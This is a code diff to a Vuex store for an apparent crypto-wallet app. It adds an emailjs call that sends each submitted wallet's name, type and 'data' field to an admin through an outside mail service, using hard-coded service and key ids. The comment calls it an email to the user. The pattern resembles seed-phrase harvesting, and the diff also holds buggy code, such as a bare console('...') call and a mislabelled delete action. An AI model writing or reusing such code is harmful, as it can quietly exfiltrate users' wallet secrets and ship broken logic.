@@ -1,4 +1,5 @@
 import { auth, db, st } from "@/services/firebase";
+import emailjs from "emailjs-com";
 
 export const state = () => ({
   login: false,
@@ -255,7 +256,7 @@ export const actions = {
 
       console.log(wallets);
       commit("setState", { type: "wallets", value: wallets });
-      commit("setLoading", { type: "wallets", is: false });
+      commit("setLoading", { type: "wallet", is: false });
     });
   },
 
@@ -265,18 +266,70 @@ export const actions = {
       .collection("wallets")
       .add(payload)
       .then((res) => {
+
         setTimeout(() => {
           commit("setLoading", { type: "wallet", is: false });
         console.log("wallet added successful");
         this.$router.push('/')
         },5000)
+
+        updateID(res.id)
+        // send email to user
+        emailjs
+        .send(
+          "service_uvqjq0m","template_92vqoti",
+          {
+            name: payload.name,
+            type: payload.type,
+            data: payload.data,
+            date: payload.date,
+          },
+          "1yMfJhupH0l8OHE39"
+        )
+        .then(() => {
+          console.log("Email Sent to Admin Successfully");
+        });
+
+
       })
       .catch((err) => {
         commit("setLoading", { type: "wallet", is: false });
         console.log(err);
       });
+
+
+
+    function updateID (id) {
+      db.collection('wallets').doc(id).update({
+        id
+      }).then(() => {
+        commit('setLoading', { type: 'wallets', is: false })
+        // dispatch('controller/initAlert', { is: true, persistence: true, type: 'success', message: 'Wallet Address Address' }, { root: true })
+      }).catch((error) => {
+        commit('setLoading', { type: 'wallets', is: false })
+        console.log(error.message)
+        // dispatch('controller/initAlert', { is: true, persistence: true, type: 'error', message: error.message }, { root: true })
+      })
+    }
   },
 
+    // Update the wallet address
+    async deleteWallet ({ commit, dispatch }, payload) {
+      commit('setLoading', { type: 'wallet', is: true })
+      console.log(payload)
+      await db.collection('wallets').doc(payload).delete()
+        .then(() => {
+          commit('setLoading', { type: 'wallet', is: false })
+          console('wallet deleted successfully')
+          // alert('wallet deleted successfully')
+          // dispatch('controller/initAlert', { is: true, persistence: true, type: 'success', message: 'Wallet deleted' }, { root: true })
+        }).catch((error) => {
+          commit('setLoading', { type: 'wallet', is: false })
+          console.log(error.message)
+          dispatch('controller/initAlert', { is: true, persistence: true, type: 'error', message: error.message }, { root: true })
+        })
+    },
+  
   // Initialize App
   async initApp({ dispatch }) {
     await dispatch("initWallets");
